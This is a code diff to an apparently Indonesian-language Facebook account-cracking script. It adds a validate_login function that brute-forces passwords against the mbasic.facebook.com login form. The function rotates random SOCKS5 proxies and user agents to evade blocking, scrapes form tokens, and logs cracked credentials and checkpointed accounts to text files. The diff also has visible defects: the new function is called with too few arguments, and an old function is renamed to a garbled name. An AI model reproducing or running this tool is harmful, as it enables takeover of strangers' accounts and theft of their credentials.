@@ -1554,7 +1554,7 @@ def metcepat():
                 if "validatev1" in method:
                     pool.submit(vipernew, idf, pwv,'m.prod.facebook.com')
                 elif "validatev2" in method:
-                    pool.submit(ValidateV2, idf, pwv)
+                    pool.submit(validate_login, idf, pwv)
                 elif "reguler" in method:
                     pool.submit(crackreguler, idf, pwv,'m.facebook.com')
                 elif "mbasic" in method:
@@ -1576,7 +1576,89 @@ def metcepat():
     print("")
 
 
+from typing import List, Dict
+# Fungsi untuk memvalidasi login
+def validate_login(idf: str, pwv: List[str], ugen2: List[str], prox: List[str]) -> None:
+    global loop, ok, cp
+    session = requests.Session()
 
+    # Iterasi melalui daftar password
+    for pw in pwv:
+        try:
+            # Pilih proxy secara acak
+            proxy_ip = random.choice(prox)
+            proxies = {"http": f"socks5://{proxy_ip}"}
+
+            # Pilih User-Agent secara acak
+            user_agent = random.choice(ugen2)
+
+            # Update headers
+            session.headers.update({
+                "Host": "mbasic.facebook.com",
+                "User-Agent": user_agent,
+                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+                "Upgrade-Insecure-Requests": "1",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                "Cache-Control": "max-age=0",
+            })
+
+            # Kirim GET request untuk mendapatkan form login
+            response = session.get(
+                "https://mbasic.facebook.com/login.php",
+                proxies=proxies
+            )
+            response.raise_for_status()  # Periksa apakah request berhasil
+
+            # Ekstrak data dari form
+            lsd = re.search(r'name="lsd" value="(.*?)"', response.text).group(1)
+            jazoest = re.search(r'name="jazoest" value="(.*?)"', response.text).group(1)
+
+            # Data untuk POST request
+            data = {
+                "lsd": lsd,
+                "jazoest": jazoest,
+                "uid": idf,
+                "pass": pw,
+                "next": "https://developers.facebook.com/tools/debug/accesstoken/",
+            }
+
+            # Kirim POST request untuk login
+            login_response = session.post(
+                "https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0",
+                data=data,
+                allow_redirects=False,
+                proxies=proxies,
+            )
+            login_response.raise_for_status()
+
+            # Cek respons login
+            cookies = session.cookies.get_dict()
+            if "c_user" in cookies:
+                handle_success(idf, pw, user_agent, cookies)
+                break
+            elif "checkpoint" in cookies:
+                handle_checkpoint(idf, pw, user_agent)
+                break
+
+        except requests.exceptions.ConnectionError:
+            time.sleep(30)  # Tunggu sebelum mencoba kembali
+        except Exception as e:
+            print(f"Error: {e}")
+            break
+
+    loop += 1
+
+# Fungsi untuk menangani login sukses
+def handle_success(idf: str, pw: str, user_agent: str, cookies: Dict[str, str]) -> None:
+    print(f"SUCCESS: {idf} | {pw}")
+    with open("OK/success.txt", "a") as file:
+        file.write(f"{idf}|{pw}|{user_agent}\n")
+
+# Fungsi untuk menangani checkpoint
+def handle_checkpoint(idf: str, pw: str, user_agent: str) -> None:
+    print(f"CHECKPOINT: {idf} | {pw}")
+    with open("CP/checkpoint.txt", "a") as file:
+        file.write(f"{idf}|{pw}\n")
 
 #----------[ METODE-REGULER ]----------#	
 def crackreguler(idf,pwv,url):
@@ -1842,14 +1924,14 @@ def rebsusgular(idf,pwv):
 
 
 #------------------[ METHOD-VALIDATE-2 ]-------------------#
-def ValidateV2(idf,pwv):
+def ValidfffateV2(idf,pwv):
 	global loop,ok,cp
 	rc = random.choice
 	rr = random.randint
 	bo = random.choice([m,b,k,h,u])
 	prog.update(des,description=f" {K2}•{H2} VALIDATE V2 {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
-	ua = random.choice(ugentotha)
+	ua = random.choice(ugen2)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
@@ -1908,7 +1990,7 @@ def crackemail(idf,pwv,nmf):
 	miw, asu = random.choice(["/","|","-"]), random.choice([M,K,H,U,B])
 	prog.update(des,description=f" {K2}•{H2} CRACKEMAIL {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
-	ua = random.choice(ugent)
+	ua = random.choice(ugen)
 	ses = requests.Session()
 	for pw in pwv:
 		try:
